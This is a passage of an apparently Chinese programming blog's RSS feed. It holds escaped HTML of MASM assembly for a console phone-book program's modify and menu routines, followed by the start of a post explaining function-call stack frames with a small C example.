	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;比较&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;里存的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;repe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmpsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;不相等就进入下一次循环&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;相等&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;就是该用户的序号&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;modify_process&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;结束循环&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFindNoone&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;modify_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;输入新的姓名&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputNewName&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取输入的用户名&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TempTeleContacts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;输入新的电话&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputNewNum&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取电话号码&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TempTeleContacts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tel&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;修改&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TempTeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;把&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指地址的一个字节搬移到&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指的地址上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;rep&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;movsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;成功修改&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szModifySuccess&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ModifyData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;


&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;begin_while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;清空屏幕&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_system_cls&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_system&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;	

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获得控制台输出句柄&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;GetStdHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;STD_OUTPUT_HANDLE&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;		&lt;span class=&quot;nx&quot;&gt;stdOutHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印电话本首页&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;WriteConsole&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stdOutHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;控制台输出句柄&lt;/span&gt;
						  &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szShowMenu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;字符串指针&lt;/span&gt;
					      &lt;span class=&quot;nx&quot;&gt;ShowMenuSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;字符长度&lt;/span&gt;
						  &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byteWritten&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;返回输出字节数&lt;/span&gt;
						  &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;未使用&lt;/span&gt;
	
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获得控制台输入句柄&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;GetStdHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;STD_INPUT_HANDLE&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;		&lt;span class=&quot;nx&quot;&gt;stdInHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;等待用户输入&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;ReadConsole&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;stdInHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;					  &lt;span class=&quot;nx&quot;&gt;ADDR&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;					  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;					  &lt;span class=&quot;nx&quot;&gt;ADDR&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytesRead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;StdOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; 
	
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取用户的输入&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_int&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;有两个参数&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;需要平衡&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;字节&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;	
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AddData&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ShowData&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3&quot;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FindData&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;4&quot;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DelData&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;5&quot;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ModifyData&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;6&quot;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt; 
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input_error&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;提示输入正确选项&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;input_error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szInputError&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;添加暂停&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;end_switch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_system_pause&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_system&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;begin_while&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;退出&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;INVOKE&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ExitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Mon, 20 Apr 2020 20:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/04/20/%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0%E7%94%B5%E8%AF%9D%E6%9C%AC-Tips/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/04/20/%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0%E7%94%B5%E8%AF%9D%E6%9C%AC-Tips/</guid>
        
        <category>逆向</category>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>通过画堆栈图解析汇编中函数调用的过程</title>
        <description>&lt;h1 id=&quot;堆栈图解析汇编中函数调用的过程&quot;&gt;堆栈图解析汇编中函数调用的过程&lt;/h1&gt;

&lt;h2 id=&quot;c语言中的函数&quot;&gt;C语言中的函数&lt;/h2&gt;

&lt;p&gt;三个关键点：局部变量、参数、函数返回值&lt;/p&gt;

&lt;p&gt;下面是示例程序&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &quot;stdafx.h&quot;
int Plus(int x, int y)
{
  int z = 2;
  return x+y+z;
}
int main(int argc, char* argv[])
{
  int r = Plus(3, 4);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;画堆栈图&quot;&gt;画堆栈图&lt;/h2&gt;

&lt;p&gt;esp ：栈顶&lt;/p&gt;

&lt;p&gt;ebp：栈底&lt;/p&gt;

&lt;p&gt;对于函数调用，先压入参数，再执行 call&lt;/p&gt;

&lt;p&gt;对于参数，从右向左依次压入堆栈（stdcall 模式）
因此，本程式先压入 4，再压入 3&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;调用前的堆栈&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd3p8dc1t4j325o0nmqv5.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.15.54&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lwdkvvwj30f60f2taw.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.18.00&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PUSH 4
PUSH 3
向栈内压入 4 ，esp - 4 ，eip 向下一条
向栈内压入 3 ，esp - 4 ，eip 向下一条&lt;/p&gt;
  &lt;/li&gt;
